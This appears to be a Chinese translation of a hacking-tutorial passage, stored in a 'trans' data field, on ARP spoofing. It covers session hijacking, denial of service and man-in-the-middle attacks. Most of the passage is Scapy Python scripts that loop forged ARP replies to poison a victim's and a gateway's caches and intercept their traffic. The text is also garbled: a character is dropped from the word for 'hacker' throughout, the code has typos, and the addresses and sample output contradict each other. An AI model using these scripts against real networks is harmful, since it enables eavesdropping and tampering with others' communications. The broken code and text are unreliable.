  trans: "\n\n当黑者到达这一步时，他们还能做其他一些事情，包括：\n\n### 1. 会话劫持 (Session hijack)\n黑者能够做的第一之一是利用伪造的\
    \ `ARP` 包来窃取会话 ID，这样他们以后就可以这些凭据进入系统，并在稍后执行他们想做的事情。\n\n### 2. DoS 攻击\n这可以在我们之前提到的\
    \ `ARP` 欺骗同时进行。它将帮助将网络 IP 地址名称映射到黑者的 MAC 地址上。然后，所有给黑者的数据将以这种速度直接发送到目标计算机，导致系统过载，使其无法再做出响应。\n\
    \n### 3. 中人攻击 (Man in the middle attack)\n在此类攻击中，黑者将成为网络的一部分，但没有人能发现他们的存在。黑者能够修改并拦截目标与网络中其他人之间发生的所有信息。然后，信息甚至可以被修改并发送回系统，而通信双方都不会知道黑者曾出现过或进行过任何更改。\n\
    \n现在我们对这种中间攻击有了进一步的了解，也知道了为什么黑者可能会使用它，现在是时候看看我们可以做什么来实施这种欺骗，并借助 `Python` 语言和 `Kali\
    \ Linux` 开始编写其中一个中间攻击来完成工作了：\n\n对于这一部分，我们将使用 `Scapy`。目标和黑者的计算机位于同一个 `10.0.0.0/24`\
    \ 网络。黑者计算机的 IP 地址将是 `10.0.0.231`，MAC 地址为 `00:14:38:00:0:01`。对于目标计算机，我们将使用 IP 地址\
    \ `10.0.0.209`，其 MAC 地址为 `00:19:56:00:00:01`。\n\n在这里，我们将通过伪造 `ARP` 包来开始这次攻击以欺骗受害者，并将使用\
    \ `Scapy` 模块来实现这一点。\n\n```python\n>>>arpFake = ARP()\n>>>arpFake.op=2\n>>>arpFake.psrc=\"\
    10.0.0.1\"\n>>>arpFake.pdst=\"10.0.0.209\"\n>>>arpFake.hwdst=\"00:14:38:00:00:02\"\
    \n>>>arpFake.show()\n```\n\n```\n[ARP]###\nhwtype=0x1\nptype=0x800\nhwlen=6\n\
    plen=4\nop= is-at\nhwsrc= 00:14:28:00:00:01\npsrc= 10.0.0.1\nhwdst= 00:14:38:00:00:02\n\
    pdst= 10.0.0.209\n```\n\n如果你查看目标的 `ARP` 表，在数据包发送之前，它看起来如下所示：\n\n```bash\nuser@victim-PC:/#\
    \ arp-a\n?(10.0.0.1) at 00:19:56:00:00:001 [ether] on eth 1\nattacker-P.local\
    \ (10.0.0.231) at 00:14:38:00:00:001 [ether] eth 1\n```\n\n一旦你通过 `Scapy` 的帮助使用\
    \ `send(arpFake)` 命令发送了此数据包，目标的 `ARP` 表将如下所示：\n\n```bash\nuser@victim-PC:/# arp-a\n\
    ? (10.0.0.1) at 00:19:56:00:00:001 [ether] on eth 1\nAttacker-PC.local (10.0.0.241)\
    \ at 00:14:38:00:00:001 [ether] eth 1\n```\n\n现在，这是我们开始处理中间攻击的好时机。但这种方法会产生一个重大问题。主要问题是默认网关最终会发送带有正确\
    \ MAC 地址的 `ARP` 包。这意味着在某个时刻，目标将不再被黑者欺骗，通信将不再像以前那样流向黑者。\n\n这里的好消息是，有一个解决方案可以帮助解决这个问题并让一切重回正轨。这个解决方案是黑者将在通信中进行嗅探，无论默认网关最终向哪里发送\
    \ `ARP` 回复，黑者都将利用这一点来帮助欺骗目标。\n\n我们用来实现这一点的代码包括：\n\n```python\n#!/usr/bin/python\n\
    # Import scapy\nfrom scapy.all import*\n\n# Setting variable\nattIP=\"10.0.0.231\"\
    \nattMAC=\"00:14:38:00:00:01\" evenvicIP=\"10.0.0.209\"\nvicMAC=\"00:14:38:00:00:02\"\
    \ndgwIP=\"10.0.0.1\"\ndgwMAC=\"00:19:56:00:00:01\"\n\n# Forge the ARP packet\n\
    arpFake = ARP()\narpFake.op=2\narpFake.psr=dgwIP\narpFake.pdst=vicIP\narpFake.hwdst=vicMAC\n\
    \n# While loop to send ARP\n# when the cache is not spoofed\nwhile True:\n   \
    \ # Send the ARP replies\n    send(arpFake)\n    print \"ARP sent\"\n    #Wait\
    \ for an ARP replies from the default GW\n    sniff(filter=\"arp and host 10.0.0.1\"\
    , count=1)\n```\n\n为了帮助我们确保此脚本以正确的方式运行，我们必须在这里停下，并确保它被保存为 Python 使用的文件之一。一旦我们花时间将其全部保存，你将是该文件的管理员，并可以在任何时候以相应的权限运行该文件。\n\
    \n现在，我们可以继续处理此过程的下一个部分。此时，目标发送到我们正在使用的网络或我们设置的网络之外的任何网络的任何通信，在通过其默认网关后，都应该直接发送给黑者。\n\
    \n这里仍然有一个我们需要处理的问题。虽然在这种情况下，黑者能够看到目标与任何他们想要通信的其他人之间的某些信息，但我们会发现我们完全无法阻止这些信息。信息仍然直接发送给预期的接收者，黑者无法进行任何更改。这是由于我们完全没有对该网关的\
    \ `ARP` 表进行任何欺骗。\n\n我们需要确保此能够发生并为黑者提供更多所需控制权的代码如下：\n\n```python\n#!/usr/bin/python\n\
    # Import scapy\nfrom scapy.all import*\n\n# Setting variables\nattIP=\"10.0.0.231\"\
    \nattMAC=\"00:14:38:00:00:01\"\nvicIP=\"10.0.0.209\"\ndgwIP=\"10.0.0.1\"\ndgwMAC=\"\
    00:19:56:00:00:01\"\n\n# Forge the ARP packet for the victim\narpFakeVic = ARP()\n\
    arpFakeVic.op=2\narpFakeVic.psr=dgwIP\narpFakeVic.pdst=vicIP\narpFakeVic.hwdst=vicMAC\n\
    \n# Forge the ARP packet for the default GQ\narpFakeDGW = ARP()\narpFakeDGW.op=2\n\
    arpFakeDGW.psrc=vicIP\narpFakeDGW.pdst=dgwIP\narpFakeDGW.hwdst=dgwMAC\n\n# While\
    \ loop to send ARP\n# when the cache is not spoofed\nwhile True:\n    # Send the\
    \ ARP replies\n    send(arpFakeVic)\n    send(arpFakeDGW)\n    print \"ARP sent\"\
    \n    # Wait for an ARP replies from the default GW\n    Sniff(filter=\"arp and\
    \ host 10.0.0.1 or host 10.0.0.209\", count=1)\n```\n\n现在 `ARP` 欺骗已完成。如果你愿意，可以浏览目标计算机的网站，但你可能会发现连接被拦截。这是因为大多数计算机在\
    \ IP 地址与目标地址相同的情况下才会发送数据包，但我们稍后会详细说明。起初这看起来代码很多，但请记住它将帮助我们设置一种非常强烈的攻击。\n\n在这一切准备就绪后，你已经完成了你的第一个中间攻击。\n\
    \n"
